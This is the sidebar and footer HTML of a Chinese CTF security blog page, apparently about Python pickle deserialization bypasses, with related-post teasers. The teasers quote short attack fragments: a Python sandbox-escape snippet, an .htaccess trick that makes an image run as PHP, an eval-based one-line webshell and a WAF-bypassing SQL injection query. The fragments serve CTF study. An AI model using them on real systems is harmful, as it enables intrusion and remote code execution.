如何查看一个函数的OpCode? 12345def a(): if 1 == 2:  print(&quot;flag&#123;****&#125;&quot;)print &quot;Opcode of a():&quot;,a.__code__.co_code.encode(&#x27;hex&#x27;) 通过此方法我们可以得到a函数的OpCode  co_code string of raw compiled bytecode  Opcode of a(): 6401006402006b020072140064030047486e000064000053 我们可以通过dis库获得相应的解析结果。 123import...</div></div></div></a><a class="pagination-related" href="/2020/03/12/Python%E4%BB%A3%E7%A0%81%E5%AF%B9%E8%B1%A1code-object%E4%B8%8E-code-%E5%B1%9E%E6%80%A7/" title="Python代码对象code-object与__code__属性"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-12</div><div class="info-item-2">Python代码对象code-object与__code__属性</div></div><div class="info-2"><div class="info-item-1">0x01概念 代码对象 code object 是一段可执行的 Python 代码在 CPython 中的内部表示。 可执行的 Python 代码包括：  函数 模块 类 生成器表达式  当你运行一段代码时，它被解析并编译成代码对象，随后被 CPython 虚拟机执行。 代码对象包含一系列直接操作虚拟机内部状态的指令。 这跟你在用 C 语言编程时是类似的，你写出人类可读的文本，然后用编译器转换成二进制形式，二进制代码（C 的机器码或者是 Python 的字节码）被 CPU（对于 C 语言来说）或者 CPython 虚拟机虚拟的 CPU 直接执行。 代码对象除了包含 指令，还提供了虚拟机运行代码所需要的一些 额外信息。 0x02探索 以下的内容是在 Python 3.7 中实验的，而且主要是针对于函数来讲。至于模块和类虽然也是通过代码对象实现的（实际上，.pyc 文件里面就存放着序列化的模块代码对象），但是代码对象的大多数特性主要和函数相关。 关于版本需要注意两点：  在 Python 2 中，函数的代码对象通过 函数.func_code 来访问；而 Python 3...</div></div></div></a><a class="pagination-related" href="/2020/02/23/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="python沙箱逃逸"><img class="cover" src="/images/Wallpaper/eatham.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-23</div><div class="info-item-2">python沙箱逃逸</div></div><div class="info-2"><div class="info-item-1">https://www.jianshu.com/p/a77c50dfebcb 12345678910111213#!/usr/bin/env python# encoding: utf-8cnt=0for item in [].__class__.__base__.__subclasses__():    try:        if &#x27;os&#x27; in item.__init__.__globals__:            print cnt,item        cnt+=1    except:        print &quot;error&quot;,cnt,item        cnt+=1       ...</div></div></div></a><a class="pagination-related" href="/2020/05/07/CTF%E4%B8%AD%E7%9A%84htaccess/" title="CTF中的htaccess"><img class="cover" src="/images/Wallpaper/eatham.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-07</div><div class="info-item-2">CTF中的htaccess</div></div><div class="info-2"><div class="info-item-1">服务器中间件为apache，因此想到了传.htaceess来解析php，通常我们用 .htaccess来解析非php后缀文件时用到 AddType application/x-httpd-php .ppp 或者 123&lt;FilesMatch &quot;shell.jpg&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; auto_append_file和auto_prepend_file 相关bypass 如果文件末尾被自动加上一句话,会导致服务器500错误,这时候可以在最后添加#\ 将换行转义成普通字符 如果特殊字符被实体编码, 可以通过特殊编码来绕过   相关比赛 XNUCA2019Qualifier </div></div></div></a><a class="pagination-related" href="/2020/03/19/PHP-RCE-Bypass/" title="PHP-RCE-Bypass"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-19</div><div class="info-item-2">PHP-RCE-Bypass</div></div><div class="info-2"><div class="info-item-1">无参数函数执行 https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/ 大致思路如下：  利用超全局变量进行bypass，进行RCE 进行任意文件读取  什么是无参数函数RCE 传统意义上，如果我们有 1eval($_GET[&#x27;code&#x27;]); 即代表我们拥有了一句话木马，可以进行getshell，例如  但是如果有如下限制 1if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;       ...</div></div></div></a><a class="pagination-related" href="/2020/02/27/PHP%E5%8F%82%E6%95%B0%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/" title="PHP参数字符串解析特性"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-27</div><div class="info-item-2">PHP参数字符串解析特性</div></div><div class="info-2"><div class="info-item-1">利用PHP的字符串解析特性Bypass ​     我们知道PHP将查询字符串（在URL或正文中）转换为内部GET或的关联数组_GET或的关联数组G​ET或的关联数组_POST。例如：/?foo=bar变成Array([foo]  =&gt;  “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过： 1/news.php?%20news[id%00=42&quot;+AND+1=0-- ​    上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。 ​    PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：  ​    1.删除空白符 ​    2.将某些字符转换为下划线（包括空格）  ​    例如：    User input Decoded...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="lv-container" data-id="city" data-uid="MTAyMC80NzA1My8yMzU1Mw=="></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">LYC</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">251</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">49</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Pickle构造原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-Pickle%E6%98%AF%E5%B9%B2%E4%BB%80%E4%B9%88%E7%94%A8%E7%9A%84%EF%BC%9A%E5%BA%8F%E5%88%97%E5%8C%96%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 Pickle是干什么用的：序列化、反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-pickle-loads%E6%9C%BA%E5%88%B6%EF%BC%9A%E8%B0%83%E7%94%A8-Unpickler%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 pickle.loads机制：调用_Unpickler类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Unpickler%E7%B1%BB%EF%BC%9A%E8%8E%AB%E5%BE%97%E6%84%9F%E6%83%85%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%99%A8"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 _Unpickler类：莫得感情的反序列化机器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-pickletools%EF%BC%9A%E8%89%AF%E5%BF%83%E8%B0%83%E8%AF%95%E5%99%A8"><span class="toc-number">1.4.</span> <span class="toc-text">0x03 pickletools：良心调试器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%99%A8%EF%BC%9A%E8%AF%AD%E6%B3%95%E4%B8%A5%E6%A0%BC%E3%80%81%E5%90%91%E5%89%8D%E5%85%BC%E5%AE%B9"><span class="toc-number">1.5.</span> <span class="toc-text">0x04 反序列化机器：语法严格、向前兼容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E8%B5%B7%E6%9D%A5%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%AA%E5%B0%8F%E4%BE%8B%E5%AD%90%EF%BC%9A"><span class="toc-number">1.5.1.</span> <span class="toc-text">一起来分析一个小例子：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-reduce-%EF%BC%9A%EF%BC%88%E6%9B%BE%E7%BB%8F%E7%9A%84%EF%BC%89%E4%B8%87%E6%81%B6%E4%B9%8B%E6%BA%90"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 __reduce__：（曾经的）万恶之源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E9%BB%91%E5%90%8D%E5%8D%95%EF%BC%9A%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7"><span class="toc-number">2.2.</span> <span class="toc-text">0x02 绕过函数黑名单：奇技淫巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8C%85%E5%90%AB%EF%BC%9Ac%E6%8C%87%E4%BB%A4%E7%A0%81%E7%9A%84%E5%A6%99%E7%94%A8"><span class="toc-number">2.3.</span> <span class="toc-text">0x03 全局变量包含：c指令码的妙用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E7%BB%95%E8%BF%87c%E6%8C%87%E4%BB%A4module%E9%99%90%E5%88%B6%EF%BC%9A%E5%85%88%E8%AF%BB%E5%85%A5%EF%BC%8C%E5%86%8D%E7%AF%A1%E6%94%B9"><span class="toc-number">2.4.</span> <span class="toc-text">0x04 绕过c指令module限制：先读入，再篡改</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E4%B8%8D%E7%94%A8reduce%EF%BC%8C%E4%B9%9F%E8%83%BDRCE"><span class="toc-number">2.5.</span> <span class="toc-text">0x05 不用reduce，也能RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82"><span class="toc-number">2.6.</span> <span class="toc-text">0x06 一些细节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-input%E5%87%BD%E6%95%B0"><span class="toc-number">2.7.</span> <span class="toc-text">0x07 input函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E4%BB%BB%E6%84%8F%E5%87%BD%E6%95%B0%E6%9E%84%E9%80%A0"><span class="toc-number">2.8.</span> <span class="toc-text">0x08 任意函数构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-%E7%B1%BB%E5%87%BD%E6%95%B0%E6%9E%84%E9%80%A0"><span class="toc-number">2.9.</span> <span class="toc-text">0x09 类函数构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-%E6%9E%84%E9%80%A0SSTI"><span class="toc-number">2.10.</span> <span class="toc-text">0x10 构造SSTI</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">快速回顾</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">CTF题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E6%A0%A1%E6%88%98-%E7%96%AB"><span class="toc-number">4.1.</span> <span class="toc-text">高校战&quot;疫&quot;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-Guess-game"><span class="toc-number">4.2.</span> <span class="toc-text">SUCTF 2019 Guess_game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code-Breaking-2018-picklecode"><span class="toc-number">4.3.</span> <span class="toc-text">Code-Breaking 2018 picklecode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BalsnCTF-2019-Pyshv1"><span class="toc-number">4.4.</span> <span class="toc-text">BalsnCTF 2019 Pyshv1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BalsnCTF-2019-Pyshv2"><span class="toc-number">4.5.</span> <span class="toc-text">BalsnCTF 2019 Pyshv2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BalsnCTF-2019-Pyshv3"><span class="toc-number">4.6.</span> <span class="toc-text">BalsnCTF 2019 Pyshv3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISNC2019-iKun"><span class="toc-number">4.7.</span> <span class="toc-text">CISNC2019 iKun</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">Python Opcode</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/29/4GPU%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E7%BB%B4%E6%8A%A4/" title="4GPU服务器环境配置及维护"><img src="/images/Wallpaper/rainbowcat.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="4GPU服务器环境配置及维护"/></a><div class="content"><a class="title" href="/2023/08/29/4GPU%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E7%BB%B4%E6%8A%A4/" title="4GPU服务器环境配置及维护">4GPU服务器环境配置及维护</a><time datetime="2023-08-29T12:00:26.000Z" title="发表于 2023-08-29 20:00:26">2023-08-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/29/UEFI-systemd%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/" title="UEFI+systemd开机启动流程"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="UEFI+systemd开机启动流程"/></a><div class="content"><a class="title" href="/2023/08/29/UEFI-systemd%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/" title="UEFI+systemd开机启动流程">UEFI+systemd开机启动流程</a><time datetime="2023-08-29T08:39:54.000Z" title="发表于 2023-08-29 16:39:54">2023-08-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/27/udev%E9%85%8D%E7%BD%AELinux%E7%BD%91%E7%BB%9C%E6%8E%A5%E5%8F%A3/" title="udev配置Linux网络接口"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="udev配置Linux网络接口"/></a><div class="content"><a class="title" href="/2023/08/27/udev%E9%85%8D%E7%BD%AELinux%E7%BD%91%E7%BB%9C%E6%8E%A5%E5%8F%A3/" title="udev配置Linux网络接口">udev配置Linux网络接口</a><time datetime="2023-08-27T12:49:29.000Z" title="发表于 2023-08-27 20:49:29">2023-08-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/27/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E7%BB%9C%E8%BF%90%E7%BB%B4/" title="实验室服务器网络运维"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="实验室服务器网络运维"/></a><div class="content"><a class="title" href="/2023/08/27/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E7%BB%9C%E8%BF%90%E7%BB%B4/" title="实验室服务器网络运维">实验室服务器网络运维</a><time datetime="2023-08-27T12:20:23.000Z" title="发表于 2023-08-27 20:20:23">2023-08-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/21/Attention%E6%9C%BA%E5%88%B6-transformer/" title="Attention机制_transformer"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="Attention机制_transformer"/></a><div class="content"><a class="title" href="/2022/11/21/Attention%E6%9C%BA%E5%88%B6-transformer/" title="Attention机制_transformer">Attention机制_transformer</a><time datetime="2022-11-21T11:55:15.000Z" title="发表于 2022-11-21 19:55:15">2022-11-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By LYC</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(async () => {
  const showKatex = () => {
    document.querySelectorAll('#article-container .katex').forEach(el => el.classList.add('katex-show'))
  }

  if (!window.katex_js_css) {
    window.katex_js_css = true
    await btf.getCSS('https://cdn.jsdelivr.net/npm/katex/dist/katex.min.css')
    if (true) {
      await btf.getScript('https://cdn.jsdelivr.net/npm/katex/dist/contrib/copy-tex.min.js')
    }
  }

  showKatex()
})()</script><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo

  const loadLivere = (el, path) => {
    window.livereOptions = {
      refer: path || location.pathname
    }

    if (isShuoshuo) {
      window.shuoshuoComment.destroyLivere = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    if (typeof LivereTower === 'object') window.LivereTower.init()
    else {
      (function(d, s) {
          var j, e = d.getElementsByTagName(s)[0];
          if (typeof LivereTower === 'function') { return; }
          j = d.createElement(s);
          j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
          j.async = true;
          e.parentNode.insertBefore(j, e);
      })(document, 'script');
    }
  }

  if (isShuoshuo) {
    'Livere' === 'Livere'
      ? window.shuoshuoComment = { loadComment: loadLivere }
      : window.loadOtherComment = loadLivere
    return
  }

  if ('Livere' === 'Livere' || !false) {
    if (false) btf.loadComment(document.getElementById('lv-container'), loadLivere)
    else loadLivere()
  } else {
    window.loadOtherComment = loadLivere
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>